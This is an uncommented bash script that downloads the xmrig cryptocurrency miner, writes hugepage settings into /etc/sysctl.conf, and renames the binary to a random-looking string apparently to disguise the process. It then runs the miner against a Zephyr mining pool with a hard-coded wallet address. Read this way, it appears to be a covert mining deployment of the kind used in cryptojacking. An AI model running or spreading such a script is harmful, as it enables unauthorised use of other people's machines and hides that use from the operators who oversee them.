#!/bin/bash
sudo apt-get update
sudo sysctl -w vm.nr_hugepages=1280
sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
VERSION=6.21.0
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/xmrig-$VERSION
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz
mv xmrig-$VERSION-linux-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-linux-x64.tar.gz
rm -rf xmrig-$VERSION-linux-x64.tar.gz && cd xmrig-$VERSION
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f  xmrig
POOL=ca-zephyr.miningocean.org:5432
USERNAME=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB
ALGO=rx/0
DONATE=1
./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.ws-p x -a $ALGO -k --tls
